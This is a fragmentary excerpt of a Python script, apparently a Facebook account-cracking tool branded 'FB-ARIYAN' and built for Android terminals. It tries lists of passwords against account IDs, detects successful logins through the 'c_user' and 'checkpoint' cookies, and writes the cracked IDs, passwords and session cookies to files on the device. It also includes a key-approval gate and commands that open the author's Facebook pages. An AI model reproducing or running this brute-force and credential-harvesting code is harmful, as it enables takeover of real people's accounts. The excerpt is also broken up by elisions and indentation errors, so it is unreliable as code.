...
def banner():
 ...
 /_/    \_\_|  \_\_____|  |_/_/    \_\_| \_|      
   {H}    {P}[{H}•{P}] Author    :{warna} ARIYAN                  {N}{H}
  {H}     {P}[{H}•{P}] Facebook  : {H} ARIYAN CHOWDHURY         {N}{H}    
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("\x1b[1;97m >> My Facebook account Sent Your key ");
      time.sleep(0.1)
...
def mainx():
    ...
    print(f'{K} [{H}8{K}] {N}Contract FB-ARIYAN')
    ...
    if mahin in ["1","01"]:
     ...
     print(f'{gen}{RED}Exited {H}FB-ARIYAN {P}Terminal ');os.system("xdg-open https://www.facebook.com/Ariyan.of.king143?mibextid=ZbWKwL");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.JEEVAN.cyber/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/Ariyan.of.king143?mibextid=ZbWKwL");mainx()
def mainx2():
    os.system("clear")
    banner()
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             open(' /sdcard/ARIYAN-GREEN-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
                ...
                open(' /sdcard/ARIYAN-GREEN-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
 ...
 for pw in pwv:
  try:
   ...
   if "checkpoint" in po.cookies.get_dict().keys():
    ...
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mARIYA -CP{P}] \033[1;30m{idf}|{pw}{xxx}')
    open(' /sdcard/ARIYAN-GREEN-CP.txt','a').write(idf+'|'+pw+'\n')
    ok.append(idf+'|'+pw)
    cp+=1
    break
...
def m4(idx,pwv):
 ...
 # gif = random.choice(["\x1b[1;91m•    ","\x1b[1;92m••   ","\x1b[1;93m•••  ","\x1b[1;94m•••• ","\x1b[1;95m•••••"])
  animasi = random.choice(["\x1b[1;91mARIYAN","\x1b[1;92mARIYAN","\x1b[1;93mARIYAN","\x1b[1;94mARIYAN","\x1b[1;95mARIYAN","\x1b[1;96mARIYAN","\x1b[1;97mARIYAN","\x1b[1;91mARIYAN ","\x1b[1;92mARIYA ","\x1b[1;93mARIYAN","\x1b[1;94mARIYAN","\x1b[1;95mARIYA ","\x1b[1;96mARIYAN"])
  ...
  for pw in pwv:
    try:
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
        if 'y' in cp_xdx:
         print(f'\r{P} [\033[1;30mJEEVAN-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
        open(' /sdcard/ARIYAN-GREEN-CP.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        ...
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/ARIYAN-GREEN-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    ok+=1 
    open(' /sdcard/ARIYAN-GREEN-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mARIYA -CP{P}] \033[1;30m{idf}|{ps}{xxx}')
    open(' /sdcard/ARIYAN-GREEN-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
...
def m5(idf,pw):
 ...
 global ok
 global agents
 animasi = random.choice(["\x1b[1;91mARIYAN","\x1b[1;92mARIYAN","\x1b[1;93mARIYAN","\x1b[1;94mARIYAN","\x1b[1;95mARIYAN","\x1b[1;96mARIYAN","\x1b[1;97mARIYAN","\x1b[1;91mARIYAN","\x1b[1;92mARIYAN","\x1b[1;93mARIYAN","\x1b[1;94mARIYAN","\x1b[1;95mARIYAN","\x1b[1;96mARIYAN"])
...
if __name__=='__main__':
  try:os.mkdir('ARIYAN-AHMED')
  except:pass
  try:os.mkdir('QUEEN-FARIYA')
  except:pass
#  b2()
#  mainx() 
  mainx()
